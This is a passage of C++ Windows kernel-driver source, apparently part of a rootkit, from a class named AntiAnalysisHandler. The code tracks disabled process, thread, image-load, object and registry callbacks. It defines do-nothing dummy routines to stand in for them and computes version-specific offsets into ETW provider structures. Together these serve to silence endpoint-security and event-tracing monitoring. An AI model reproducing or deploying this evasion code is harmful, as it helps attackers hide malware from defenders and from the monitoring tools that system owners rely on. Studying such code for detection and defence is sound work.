	DisabledKernelCallback* entry = FindCallback(callback);

	if (entry)
		return false;

	entry = AllocateMemory<DisabledKernelCallback*>(sizeof(DisabledKernelCallback));

	if (!entry)
		return false;
	entry->CallbackAddress = callback.CallbackAddress;
	entry->CallbackEntry = callback.CallbackEntry;
	entry->Type = callback.Type;

	switch (entry->Type) {
	case ObProcessType:
	case ObThreadType:
		AddEntry<CallbackList, DisabledKernelCallback>(&obCallbacks, entry);
		break;
	case PsCreateProcessType:
	case PsCreateProcessTypeEx:
	case PsCreateThreadType:
	case PsCreateThreadTypeNonSystemThread:
	case PsImageLoadType:
		AddEntry<CallbackList, DisabledKernelCallback>(&psRoutines, entry);
		break;
	case CmRegistryType:
		AddEntry<CallbackList, DisabledKernelCallback>(&cmCallbacks, entry);
		break;
	}
	return true;
}

/*
* Description:
* RemoveDisabledCallback is responsible for removing a disabled callback to the list of disabled callbacks.
*
* Parameters:
* @callback			  [_In_ DisabledKernelCallback*] -- Callback to search.
*
* Returns:
* @bool												 -- True if succeeded else false.
*/
_IRQL_requires_max_(APC_LEVEL)
bool AntiAnalysisHandler::RemoveCallback(_In_ DisabledKernelCallback* callback) {
	CallbackList* list = nullptr;
	auto finder = [](_In_ const DisabledKernelCallback* item, _In_ DisabledKernelCallback* searchedCallback) {
		return item->CallbackAddress == searchedCallback->CallbackAddress && item->Type == searchedCallback->Type;
	};

	if (!callback || callback->CallbackAddress == 0 || callback->Type > CmRegistryType)
		return false;

	switch (callback->Type) {
		case ObProcessType:
		case ObThreadType:
			list = &obCallbacks;
			break;
		case PsCreateProcessType:
		case PsCreateProcessTypeEx:
		case PsCreateThreadType:
		case PsCreateThreadTypeNonSystemThread:
		case PsImageLoadType:
			list = &psRoutines;
			break;
		case CmRegistryType:
			list = &cmCallbacks;
			break;
		default:
			return false;
	}
	DisabledKernelCallback* entry = FindListEntry<CallbackList, DisabledKernelCallback, DisabledKernelCallback*>(*list, 
		callback, finder);

	if (!entry)
		return false;
	return RemoveListEntry<CallbackList, DisabledKernelCallback>(list, entry);
}

/*
* Description:
* FindCallback is responsible for finding a disabled callback in the list of disabled callbacks.
* 
* Parameters:
* @callback				   [_In_ IoctlKernelCallback&] -- Callback to search.
* 
* Returns:
* @DisabledKernelCallback* 							   -- The found callback or nullptr.
*/
_IRQL_requires_max_(APC_LEVEL)
DisabledKernelCallback* AntiAnalysisHandler::FindCallback(_In_ IoctlKernelCallback& callback) const {
	DisabledKernelCallback callbackEntry = { 0 };
	callbackEntry.CallbackAddress = callback.CallbackAddress;
	callbackEntry.Type = callback.Type;
	return FindCallback(callbackEntry);
}

/*
* Description:
* FindCallback is responsible for finding a disabled callback in the list of disabled callbacks.
* 
* Parameters:
* @callback				   [_In_ DisabledKernelCallback&] -- Callback to search.
* 
* Returns:
* @DisabledKernelCallback* 								  -- The found callback or nullptr.
*/
_IRQL_requires_max_(APC_LEVEL)
DisabledKernelCallback* AntiAnalysisHandler::FindCallback(_In_ DisabledKernelCallback& callback) const {
	auto finder = [](_In_ const DisabledKernelCallback* item, _In_ DisabledKernelCallback& searchedCallback) {
		return item->CallbackAddress == searchedCallback.CallbackAddress && item->Type == searchedCallback.Type;
	};

	if (callback.CallbackAddress == 0 || callback.Type > CmRegistryType)
		return nullptr;

	switch (callback.Type) {
		case ObProcessType:
		case ObThreadType:
			return FindListEntry<CallbackList, DisabledKernelCallback, DisabledKernelCallback&>(obCallbacks, callback, finder);
		case PsCreateProcessType:
		case PsCreateProcessTypeEx:
		case PsCreateThreadType:
		case PsCreateThreadTypeNonSystemThread:
		case PsImageLoadType:
			return FindListEntry<CallbackList, DisabledKernelCallback, DisabledKernelCallback&>(psRoutines, callback, finder);
		case CmRegistryType:
			return FindListEntry<CallbackList, DisabledKernelCallback, DisabledKernelCallback&>(cmCallbacks, callback, finder);
	}
	return nullptr;
}

/*
* Description:
* ObPreOpenDummyFunction is a dummy function for pre ob callbacks.
*
* Parameters:
* @RegistrationContext [PVOID]						   -- Unused.
* @Info				   [POB_PRE_OPERATION_INFORMATION] -- Unused.
*
* Returns:
* @status			   [NTSTATUS]					   -- Always OB_PREOP_SUCCESS.
*/
OB_PREOP_CALLBACK_STATUS ObPreOpenDummyFunction(PVOID RegistrationContext, POB_PRE_OPERATION_INFORMATION Info) {
	UNREFERENCED_PARAMETER(RegistrationContext);
	UNREFERENCED_PARAMETER(Info);
	return OB_PREOP_SUCCESS;
}

/*
* Description:
* ObPostOpenDummyFunction is a dummy function for post ob callbacks.
*
* Parameters:
* @RegistrationContext [PVOID]						    -- Unused.
* @Info				   [POB_POST_OPERATION_INFORMATION] -- Unused.
*
* Returns:
* There is no return value.
*/
VOID ObPostOpenDummyFunction(PVOID RegistrationContext, POB_POST_OPERATION_INFORMATION Info) {
	UNREFERENCED_PARAMETER(RegistrationContext);
	UNREFERENCED_PARAMETER(Info);
	return;
}

/*
* Description:
* CreateProcessNotifyExDummyFunction is a dummy function for create process notify routine ex.
*
* Parameters:
* @Process    [PEPROCESS]			   -- Unused.
* @ProcessId  [HANDLE]			       -- Unused.
* @CreateInfo [PPS_CREATE_NOTIFY_INFO] -- Unused.
*
* Returns:
* There is no return value.
*/
void CreateProcessNotifyExDummyFunction(PEPROCESS Process, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo) {
	UNREFERENCED_PARAMETER(Process);
	UNREFERENCED_PARAMETER(ProcessId);
	UNREFERENCED_PARAMETER(CreateInfo);
	return;
}

/*
* Description:
* CreateProcessNotifyDummyFunction is a dummy function for create process notify routine.
*
* Parameters:
* @ParentId  [HANDLE]  -- Unused.
* @ProcessId [HANDLE]  -- Unused.
* @Create	 [BOOLEAN] -- Unused.
*
* Returns:
* There is no return value.
*/
void CreateProcessNotifyDummyFunction(HANDLE ParentId, HANDLE ProcessId, BOOLEAN Create) {
	UNREFERENCED_PARAMETER(ParentId);
	UNREFERENCED_PARAMETER(ProcessId);
	UNREFERENCED_PARAMETER(Create);
	return;
}

/*
* Description:
* CreateThreadNotifyDummyFunction is a dummy function for create thread notify routine.
*
* Parameters:
* @ProcessId [HANDLE]  -- Unused.
* @ThreadId  [HANDLE]  -- Unused.
* @Create	 [BOOLEAN] -- Unused.
*
* Returns:
* There is no return value.
*/
void CreateThreadNotifyDummyFunction(HANDLE ProcessId, HANDLE ThreadId, BOOLEAN Create) {
	UNREFERENCED_PARAMETER(ProcessId);
	UNREFERENCED_PARAMETER(ThreadId);
	UNREFERENCED_PARAMETER(Create);
	return;
}

/*
* Description:
* LoadImageNotifyDummyFunction is a dummy function for load image notify routine.
*
* Parameters:
* @FullImageName [PUNICODE_STRING] -- Unused.
* @ProcessId	 [HANDLE]		   -- Unused.
* @ImageInfo	 [PIMAGE_INFO]	   -- Unused.
*
* Returns:
* There is no return value.
*/
void LoadImageNotifyDummyFunction(PUNICODE_STRING FullImageName, HANDLE ProcessId, PIMAGE_INFO ImageInfo) {
	UNREFERENCED_PARAMETER(FullImageName);
	UNREFERENCED_PARAMETER(ProcessId);
	UNREFERENCED_PARAMETER(ImageInfo);
	return;
}

/*
* Description:
* RegistryCallbackDummyFunction is a dummy function for registry callbacks.
*
* Parameters:
* @CallbackContext [PVOID] -- Unused.
* @Argument1	   [PVOID] -- Unused.
* @Argument2	   [PVOID] -- Unused.
*
* Returns:
* STATUS_SUCCESS always.
*/
NTSTATUS RegistryCallbackDummyFunction(PVOID CallbackContext, PVOID Argument1, PVOID Argument2) {
	UNREFERENCED_PARAMETER(CallbackContext);
	UNREFERENCED_PARAMETER(Argument1);
	UNREFERENCED_PARAMETER(Argument2);
	return STATUS_SUCCESS;
}

/*
* Description:
* GetEtwProviderEnableInfoOffset is responsible for getting the ProviderEnableInfo offset depends on the windows version.
*
* Parameters:
* There are no parameters.
*
* Returns:
* @providerEnableInfo [ULONG] -- Offset of ProviderEnableInfo.
*/
_IRQL_requires_max_(APC_LEVEL)
ULONG AntiAnalysisHandler::GetEtwProviderEnableInfoOffset() const {
	ULONG providerEnableInfo = 0;

	if (WindowsBuildNumber > LATEST_VERSION)
		return providerEnableInfo;

	switch (WindowsBuildNumber) {
	case WIN_1507:
	case WIN_1511:
	case WIN_1607:
	case WIN_1703:
	case WIN_1709:
	case WIN_1803:
	case WIN_1809:
	case WIN_1903:
	case WIN_1909:
		providerEnableInfo = 0x50;
		break;
	default:
		providerEnableInfo = 0x60;
		break;
	}

	return providerEnableInfo;
}

/*
* Description:
* GetEtwGuidLockOffset is responsible for getting the GuidLock offset depends on the windows version.
*
* Parameters:
* There are no parameters.
*
* Returns:
* @etwGuidLockOffset [ULONG] -- Offset of guid lock.
*/
_IRQL_requires_max_(APC_LEVEL)
ULONG AntiAnalysisHandler::GetEtwGuidLockOffset() const {
	ULONG etwGuidLockOffset = 0;

	if (WindowsBuildNumber > LATEST_VERSION)
		return etwGuidLockOffset;

	switch (WindowsBuildNumber) {
	case WIN_1511:
	case WIN_1607:
	case WIN_1703:
	case WIN_1709:
	case WIN_1803:
	case WIN_1809:
	case WIN_1903:
	case WIN_1909:
		etwGuidLockOffset = 0x180;
		break;
	default:
		etwGuidLockOffset = 0x198;
		break;
	}

	return etwGuidLockOffset;
}